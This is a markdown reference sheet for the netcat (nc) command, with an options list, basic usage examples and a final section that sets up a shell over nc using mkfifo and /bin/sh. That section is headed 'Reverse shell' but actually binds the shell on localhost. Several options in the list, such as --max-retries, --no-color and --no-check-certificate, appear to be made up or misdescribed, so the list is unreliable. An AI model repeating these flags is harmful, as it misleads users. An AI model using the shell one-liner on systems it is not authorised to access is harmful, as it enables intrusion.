# NC Command

<!-- TOC -->
* [NC Command](#nc-command)
  * [Description](#description)
  * [Usage](#usage)
  * [Options](#options)
  * [Examples](#examples)
    * [Basic Connection](#basic-connection)
    * [Listening on a Port](#listening-on-a-port)
    * [Sending Data](#sending-data)
    * [Receiving Data](#receiving-data)
    * [Scanning for Open Ports](#scanning-for-open-ports)
    * [Using UDP](#using-udp)
    * [Connecting with a Timeout](#connecting-with-a-timeout)
    * [Reverse shell](#reverse-shell-)
<!-- TOC -->

## Description
The `nc` command, also known as **Netcat**, is a versatile networking utility that can read and write data across network connections using TCP or UDP protocols. It is often referred to as the "Swiss Army knife" of networking due to its wide range of capabilities.

## Usage
```bash
nc [options] [hostname] [port]
```
## Options
- `-C`: Use CRLF line endings instead of LF, useful for compatibility with certain protocols.
- `-e <program>`: Execute a program after establishing a connection (note: this option may not be available in all versions of Netcat due to security concerns).
- `-h`: Display help information and exit.
- `-i <interval>`: Set the interval for sending data, in seconds (useful for sending periodic messages).
- `-k`: Keep the connection open after the first client disconnects, allowing multiple connections to be handled sequentially.
- `-l`: Listen for incoming connections.
- `-n`: Do not perform DNS resolution, use numeric IP addresses only.
- `-N`: Close the connection after EOF on stdin, useful for one-time data transfers.
- `-o <file>`: Write the output to a file instead of standard output.
- `-p <port>`: Specify the local port to listen on or connect to.
- `-s <source address>`: Specify the source address to use for the connection.
- `-u`: Use UDP instead of TCP.
- `-v`: Enable verbose mode to display more information about the connection.
- `-w <timeout>`: Set a timeout for connections, in seconds.
- `-z`: Zero-I/O mode, used for scanning and checking if a port is open without sending any data.
- `-4`: Use IPv4 only.
- `-6`: Use IPv6 only.
- `--source-port <port>`: Specify the source port to use for the connection.
- `--version`: Display version information and exit.
- `--help`: Display help information and exit.
- `--no-dns`: Disable DNS resolution for hostnames.
- `--no-check-certificate`: Do not check SSL/TLS certificates (useful for secure connections).
- `--ssl`: Use SSL/TLS for secure connections (if supported by the version of Netcat).
- `--proxy <proxy>`: Use a proxy server for the connection.
- `--proxy-auth <username:password>`: Authenticate with the proxy server using the specified username and password.
- `--max-retries <count>`: Set the maximum number of connection retries before giving up.
- `--retry-delay <seconds>`: Set the delay between connection retries, in seconds.
- `--timeout <seconds>`: Set a timeout for the connection attempt, in seconds.
- `--no-color`: Disable colored output in verbose mode.
- `--log <file>`: Log connection details to a specified file.
- `--debug`: Enable debug mode for more detailed output about the connection process.
- `--no-keepalive`: Disable TCP keepalive messages for the connection.
- `--no-close`: Prevent closing the connection after sending data, allowing for persistent connections.

## Examples
### Basic Connection
```bash
  nc example.com 80
```
### Listening on a Port
```bash 
  nc -l -p 1234
```
### Sending Data
```bash
  echo "Hello, World!" | nc example.com 1234
```
### Receiving Data
```bash
  nc -l -p 1234 > received.txt
```
### Scanning for Open Ports
```bash
  nc -z -v example.com 1-1000
```
### Using UDP
```bash
  nc -u example.com 1234
```
### Connecting with a Timeout
```bash
  nc -w 5 example.com 1234
```

### Reverse shell   
```bash
# On the target machine:
  # Delete the file if exists and create a named pipe - data written to it can be read from the other end
  rm -f /tmp/f; mkfifo /tmp/f 
  # read command from the FIFO pipe. 
  # pip those commands to interactive shell.
  # redirect stderr(2) to stdout(1) so error goes to the same place as regular commands
  # pip all shell output (including error) to netcat(nc) listening on localhost:1234
  # redirect anything received from netcat(nc) to the FIFO pipe, which feed into the shell via the `cat` command completing the loop
  cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f 
  
# On the attacker's machine:
  # connect to the target machine's netcat listener on port 1234
  nc <target_ip> 1234
```

    By doing this, you create a fifo at /tmp/f and make nc listen at port
    1234 of address 127.0.0.1 on ‘server’ side, when a ‘client’ establishes a
    connection successfully to that port, /bin/sh gets executed on ‘server’
    side and the shell prompt is given to ‘client’ side.
    
    When connection is terminated, nc quits as well. Use -k if you want it
    keep listening, but if the command quits this option won't restart it or
    keep nc running. Also don't forget to remove the file descriptor once you
    don't need it anymore:
    
    $ rm -f /tmp/f
